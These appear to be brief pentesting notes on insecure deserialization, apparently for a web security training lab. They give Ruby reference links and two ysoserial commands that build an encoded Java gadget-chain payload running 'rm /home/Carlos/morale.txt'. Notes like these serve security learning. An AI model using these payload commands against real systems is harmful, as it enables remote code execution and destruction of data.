

### Ruby
https://knowledge-base.secureflag.com/vulnerabilities/unsafe_deserialization/unsafe_deserialization_ruby.html

Universal ruby deserialization for marshal
https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

### PHP


## java

magic bytes after base64 encoding the serialized object will be `rO0AB`

- ysoserial with base64 and urlencode
```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'rm /home/Carlos/morale.txt' | base64 -w0 | python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))'
```

- use docker to avoid library mismatch and dependency issues

```bash
docker run --rm ysoserial:latest CommonsCollections4 'rm /home/Carlos/morale.txt' | base64 -w0 | python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))'

```